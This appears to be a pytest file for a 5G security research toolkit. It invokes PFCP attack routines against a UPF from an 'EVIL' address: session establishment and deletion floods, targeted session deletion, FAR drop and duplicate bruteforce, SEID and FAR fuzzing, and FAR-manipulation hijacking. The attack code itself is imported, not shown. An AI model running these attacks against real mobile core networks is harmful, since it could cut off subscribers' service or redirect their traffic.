import sys
import os
import pytest
import subprocess

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
from src.attacks.pfcp.pfcpDosAttack import PFCPDosAttack
from src.attacks.pfcp.pfcpFuzzer import PFCPFuzzer
from src.attacks.pfcp.pfcpHijack import PFCPHijack
from src.utils.protocols.pfcp.pfcp_old import PFCPToolkit
from src import ip_list
import random

DEST_PORT = 8805
SRC_PORT = 8805


def test_pfcp_session_establishment_flood():
    evil_addr = ip_list["EVIL"]
    upf_addr = ip_list["UPF"]
    reqNbr = 2
    random_far_number = 1
    dos = PFCPDosAttack()
    dos.start_pfcp_session_establishment_flood(
        evil_addr=evil_addr,
        upf_addr=upf_addr,
        reqNbr=reqNbr,
        random_far_number=random_far_number,
    )


def test_pfcp_session_deletion_flood():
    evil_addr = ip_list["EVIL"]
    upf_addr = ip_list["UPF"]
    reqNbr = 2
    dos = PFCPDosAttack()
    dos.start_pfcp_session_deletion_bruteforce(
        evil_addr=evil_addr,
        upf_addr=upf_addr,
        reqNbr=reqNbr,
    )


def test_pfcp_session_deletion_targeted():
    evil_addr = ip_list["EVIL"]
    upf_addr = ip_list["UPF"]
    target_seid = 1
    dos = PFCPDosAttack()
    dos.start_pfcp_session_deletion_targeted(
        evil_addr=evil_addr,
        upf_addr=upf_addr,
        target_seid=target_seid,
    )


def test_pfcp_session_modification_far_drop_bruteforce():
    evil_addr = ip_list["EVIL"]
    upf_addr = ip_list["UPF"]
    far_range = 1
    session_range = 2
    dos = PFCPDosAttack()
    dos.start_pfcp_session_modification_far_drop_bruteforce(
        evil_addr=evil_addr,
        upf_addr=upf_addr,
        far_range=far_range,
        session_range=session_range,
    )


def test_pfcp_session_modification_far_dupl_bruteforce():
    evil_addr = ip_list["EVIL"]
    upf_addr = ip_list["UPF"]
    far_range = 1
    session_range = 2
    dos = PFCPDosAttack()
    dos.start_pfcp_session_modification_far_dupl_bruteforce(
        evil_addr=evil_addr,
        upf_addr=upf_addr,
        far_range=far_range,
        session_range=session_range,
    )


def test_pfcp_seid_fuzzing():
    src_addr = ip_list["EVIL"]
    upf_addr = ip_list["UPF"]
    max_seid = 2
    fuzzer = PFCPFuzzer()
    fuzzer.start_PFCP_SEID_fuzzing(
        src_addr=src_addr,
        upf_addr=upf_addr,
        max_seid=max_seid,
    )


def test_pfcp_far_fuzzing():
    src_addr = ip_list["EVIL"]
    upf_addr = ip_list["UPF"]
    max_far_discover = 1
    max_seid = 2
    fuzzer = PFCPFuzzer()
    fuzzer.start_PFCP_FARID_fuzzing(
        src_addr=src_addr,
        upf_addr=upf_addr,
        max_far_discover=max_far_discover,
        max_seid=max_seid,
    )


def test_pfcp_hijack_far_manipulation():
    hijacker_addr = ip_list["EVIL"]
    upf_addr = ip_list["UPF"]
    seid = 1
    hijack = PFCPHijack()
    hijack.start_PFCP_hijack_far_manipulation(
        hijacker_addr=hijacker_addr,
        upf_addr=upf_addr,
        seid=seid,
    )


def run_pfcp_tests():
    # Dos attacks
    print("[*] Testing pfcp_session_establishment_flood...")
    test_pfcp_session_establishment_flood()
    print("[+] pfcp_session_establishment_flood works!\n")

    print("[*] Testing pfcp_session_deletion_flood...")
    test_pfcp_session_deletion_flood()
    print("[+] pfcp_session_deletion_flood works!\n")

    print("[*] Testing pfcp_session_deletion_targeted...")
    test_pfcp_session_deletion_targeted()
    print("[+] pfcp_session_deletion_targeted works!\n")

    print("[*] Testing pfcp_session_modification_far_drop_bruteforce...")
    test_pfcp_session_modification_far_drop_bruteforce()
    print("[+] pfcp_session_modification_far_drop_bruteforce works!\n")

    print("[*] Testing pfcp_session_modification_far_dupl_bruteforce...")
    test_pfcp_session_modification_far_dupl_bruteforce()
    print("[+] pfcp_session_modification_far_dupl_bruteforce works!\n")

    # Fuzzing attacks
    print("[*] Testing pfcp_seid_fuzzing...")
    test_pfcp_seid_fuzzing()
    print("[+] pfcp_seid_fuzzing works!\n")

    print("[*] Testing pfcp_far_fuzzing...")
    test_pfcp_far_fuzzing()
    print("[+] pfcp_far_fuzzing works!\n")

    # Hijacking attack
    print("[*] Testing pfcp_hijack_far_manipulation...")
    test_pfcp_hijack_far_manipulation()
    print("[+] pfcp_hijack_far_manipulation works!\n")


if __name__ == "__main__":
    run_pfcp_tests()
